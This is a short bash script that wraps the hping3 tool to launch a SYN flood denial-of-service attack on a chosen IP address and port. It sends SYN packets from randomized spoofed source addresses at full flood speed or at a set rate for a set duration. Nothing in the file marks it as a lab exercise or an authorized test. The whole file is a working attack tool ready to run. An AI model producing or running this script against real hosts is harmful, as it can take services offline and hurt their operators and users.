#!/usr/bin/env bash

set -euo pipefail

usage() {
  echo "Usage: sudo $0 <TARGET_IP> <TARGET_PORT> [DURATION_SEC=60] [PPS|flood=\"flood\"] [INTERFACE(optional)]" >&2
}

if [[ ${1-} == "-h" || ${1-} == "--help" || $# -lt 2 ]]; then
  usage
  exit 1
fi

if [[ $EUID -ne 0 ]]; then
  echo "This script must be run as root (sudo)." >&2
  exit 1
fi

if ! command -v hping3 >/dev/null 2>&1; then
  echo "hping3 is required. Install with: sudo apt-get update && sudo apt-get install -y hping3" >&2
  exit 1
fi

TARGET_IP="$1"
TARGET_PORT="$2"
DURATION_SEC="${3-60}"
RATE_ARG_INPUT="${4-flood}"
INTERFACE="${5-}"

# Build rate argument
if [[ "$RATE_ARG_INPUT" == "flood" ]]; then
  RATE_ARGS=("--flood")
else
  if ! [[ "$RATE_ARG_INPUT" =~ ^[0-9]+$ ]]; then
    echo "PPS must be 'flood' or a positive integer." >&2
    exit 1
  fi
  if [[ "$RATE_ARG_INPUT" -le 0 ]]; then
    echo "PPS must be > 0." >&2
    exit 1
  fi
  # hping3 interval in microseconds; pps ~= 1e6 / interval
  INTERVAL_US=$((1000000 / RATE_ARG_INPUT))
  [[ $INTERVAL_US -lt 1 ]] && INTERVAL_US=1
  RATE_ARGS=("-i" "u${INTERVAL_US}")
fi

HPING_ARGS=(
  "-S"               # SYN flag
  "--rand-source"    # randomize spoofed source IPs (induces half-open SYN_RECV on target)
  "-p" "$TARGET_PORT"
)

if [[ -n "$INTERFACE" ]]; then
  HPING_ARGS+=("-I" "$INTERFACE")
fi

echo "Starting SYN flood against ${TARGET_IP}:${TARGET_PORT} for ${DURATION_SEC}s (rate: ${RATE_ARG_INPUT})..." >&2
set +e
hping3 "${TARGET_IP}" "${HPING_ARGS[@]}" "${RATE_ARGS[@]}" >/dev/null 2>&1 &
HPING_PID=$!

term() {
  kill -TERM "$HPING_PID" 2>/dev/null || true
  wait "$HPING_PID" 2>/dev/null || true
}
trap term INT TERM EXIT

sleep "$DURATION_SEC"
term
trap - INT TERM EXIT

echo "Completed SYN flood run." >&2

